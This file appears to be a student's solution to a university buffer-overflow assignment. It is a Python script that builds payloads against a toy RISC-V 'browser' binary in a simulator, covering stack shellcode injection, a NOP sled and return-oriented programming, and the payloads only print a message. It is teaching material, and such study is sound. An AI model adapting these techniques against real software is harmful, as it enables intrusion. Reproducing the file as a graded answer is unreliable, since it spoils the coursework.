# !!!!!!! IMPORTANT; PLZ READ !!!!!!!
# We strongly encourage you to develop your exploit in here
# since it will alleviate many potential headaches that come with
# processing raw bytes of data.
#
# Try running this program using python3. It will create a file called exploit.bin:
#   $ python3 exploit_writer.py
# and then inspect the output of the generated file using xxd:
#   $ xxd exploit.bin
# You can then run the browser binary with your exploit like so:
#   $ simulate -i <path to exploit.bin> browser
#
# You can submit a well commented version of this file as your writeup

import struct

def pack_word(p):
    '''
    pack_word(p) will treat the input [p] like a 32 bit little endian
    integer. This means that calling:
    >>> pack(0x1a2b3c4d)
    [0x4d, 0x3c, 0x2b, 0x1a]
    '''
    return struct.pack('<I', p)

def pack_str(s):
    '''
    pack_str(s) will return bytes represeting the string. For example:
    >>> pack_str("abcd")
    [0x61, 0x62, 0x63, 0x64]
    '''
    return s.encode('utf-8')

def pack_byte(b):
    '''
    pack_byte(b) will return bytes representing the individual byte.
    This can then be concatenated with other bytes.
    >>> pack_byte(0x40)
    [0x40]
    '''
    return bytes([b])

# Develop your exploit by setting the payload variable.
# Note that the payload variable is of type bytes, so you can't
# just concatenate strings to it. Instead, you can use the pack_str
# method to convert a string to bytes and concatenate that with the payload.




# Note for all exploits: browser was called by ./simulate browser // Extra credits can be run after removing ''' // no necessary actions needed beyond running python3 exploit_writer.py to prepare extra credit exploits

# This is the solution for the base assignment. The string www.google.com with byte 00 will fool gets to think that is the only input.
# The exploit will be undetected by strcmp and our exploit will be run after doprompt() is complete.

'''

payload = pack_str("www.google.com")                        # www.google.com will match with the desired input for the program
payload += pack_byte(0x00)*2                                # 00 will make gets fool gets to think that www.google.com is all of the input
payload += pack_str("LOL 0wn3d! ajb497 is on cornell.edu!") # string we want to print
payload += pack_word(0x00010000)*3                          # filler (no function)
payload += pack_word(0x7ec187f7)                            # set frame pointer to address 0x7ec187f7
payload += pack_word(0x7ec18830)                            # set return address to beginning of exploit instructions
payload += pack_word(0x00a00693) # addi a3, x0, 10          # putting ascii number of newline (0a)
payload += pack_word(0x00d70023) # sb a3, 0(a4)             # store newline at beginning of string
payload += pack_word(0x02d702a3) # sb a3, 37(a4)            # store newline at end of string
payload += pack_word(0x02070323) # sb x0, 38(a4)            # store 00 after newline so only necessary components will print
payload += pack_word(0x00200893) # addi a7, x0, 2           # prepares system call for prints
payload += pack_word(0x00070513) # addi a0, a4, 0           # setup address to print string at 0x7ec187f7
payload += pack_word(0x00000073) # ecall                    # system call prints
payload += pack_word(0x00a00893) # addi a7, x0, 10          # prepares system call for exit
payload += pack_word(0x00000073) # ecall                    # system call exit

'''

# Extra Credit pt.1
# To allow the exploit to work in a small region rather than for just a fixed address, NOPs can be used to push the pc down to the
# injected instructions. To make the region where the exploit works bigger, more NOPs will be needed. The operation of how the exploit gains control is the same as in the base case

'''

payload = pack_str("www.google.com")                        # www.google.com will match with the desired input for the program
payload += pack_byte(0x00)*2                                # 00 will make gets fool gets to think that www.google.com is all of the input
payload += pack_str("LOL 0wn3d! ajb497 is on cornell.edu!") # string we want to print
payload += pack_word(0x00010000)*3                          # filler (no function)
payload += pack_word(0x7ec187f7)                            # set frame pointer to address 0x7ec187f7
payload += pack_word(0x7ec18830)                            # set return address to beginning of exploit instructions or some of the NOPs
payload += pack_word(0x00000013)*24                         # NOPs to catch pc and send it to exploit instructions
payload += pack_word(0x00a00693) # addi a3, x0, 10          # putting ascii number of newline (0a)
payload += pack_word(0x00d70023) # sb a3, 0(a4)             # store newline at beginning of string
payload += pack_word(0x02d702a3) # sb a3, 37(a4)            # store newline at end of string
payload += pack_word(0x02070323) # sb x0, 38(a4)            # store 00 after newline so only necessary components will print
payload += pack_word(0x00200893) # addi a7, x0, 2           # prepares system call for prints
payload += pack_word(0x00070513) # addi a0, a4, 0           # setup address to print string at 0x7ec187f7
payload += pack_word(0x00000073) # ecall                    # system call prints
payload += pack_word(0x00a00893) # addi a7, x0, 10          # prepares system call for exit
payload += pack_word(0x00000073) # ecall                    # system call exit

'''


# Extra Credit pt.2
# This exploit takes advantage of a flaw in the simulator that allows instructions in .text to be overwritten. Since the exploit must work on any stack layout, return
# oriented programming is used to take parts of the instructions in .text to do certain operations




payload = pack_str("www.google.com")                        # www.google.com will match with the desired input for the program
payload += pack_byte(0x00)                                  # 00 will make gets fool gets to think that www.google.com is all of the input
payload += pack_str("LOL 0wn3d! ajb497 is on cornell.edu")  # string we want to print
payload += pack_byte(0x00)*6                                # filler (no function)
payload += pack_word(0x33333333)*2                          # filler (no function)
payload += pack_word(0x00010360)                            # set fp to 0x00010360 will help load instruction @ 1033c: 01c0006f j 10358 <strcmp+0x50> this instruction will jump 7 spaces ahead
payload += pack_word(0x000101a8)                            # returns to 0x000101a8 in gets instruction: fdc42783 lw a5,-36(s0) / loads instruction to overwrite instruction at another point in .text
payload += pack_word(0x00010000)*10                         # filler (no function)
payload += pack_word(0x000101d0)                            # set fp to 0x000101d0 will be subtracted by 20 to allow loaded instruction to be placed at 0x000101bc which is in gets
payload += pack_word(0x00010444)                            # returns to 0x00010444 in do prompt so it will overwrite the instruction at 0x000101bc this will allow the do prompt action that starts at 0x00010440
                                                            # to be able to properly store the a4
payload += pack_word(0x00010000)*18                         # filler (no function)
payload += pack_word(0x00011588)                            # set fp to 0x00011588 will help store address of string "LOL..." in a4 to address 0x00011574
payload += pack_word(0x000101b8) #do prompt                 # returns to 0x000101b8 which will store a4 value at address 0x00011574
payload += pack_word(0x00010000)*10                         # filler (no function)
payload += pack_word(0x00010560)                            # set fp to 0x00010560 will help get address 0x00010518 after being subtracted by 72 to get newline (0a) stored at location
payload += pack_word(0x00010440) #do prompt                 # returns to 0x00010440 which will get address of newline at 0x00010518 and set a0 to that address
payload += pack_word(0x00010000)*18                         # filler (no function)
payload += pack_word(0x00011588)                            # set fp to 0x00011588 will help get address 0x00011574 in order to print string "LOL..."
payload += pack_word(0x00010384) #do response               # returns to 0x00010384 so that it will do in order: 1. print newline at address 0x00010518, 2. print string "LOL...", 3. print !/n at address 0x000104f0
payload += pack_word(0x00010000)*6                          # filler (no function)
payload += pack_word(0x00010000)                            # filler (no function) fp doesn't matter because nothing in following action requires fp usage
payload += pack_word(0x000104c8) #do main                   # returns to 0x000104c8 in main so that it can prepare the program to exit by making register a0 = 0
payload += pack_word(0x00010000)*10                         # filler (no function)
payload += pack_word(0x00010000)                            # filler (no function) fp doesn't matter because the program is about to exit
payload += pack_word(0x000102b8)                            # returns to 0x000102b8 in exit so that the program can exit



# if you run `python3 assemble.py insns` it will generate an insns.hex file
# with the hex representation of your assembly. This adds those hex values
# to the payload
with open("insns.hex", "r") as f:
    for line in f:
        payload += pack_word(int(line.strip(), 16))

# To inspect the actual bytes in exploit.bin, run:
#   xxd exploit.bin
with open("exploit.bin", "wb+") as f:
    f.write(payload)
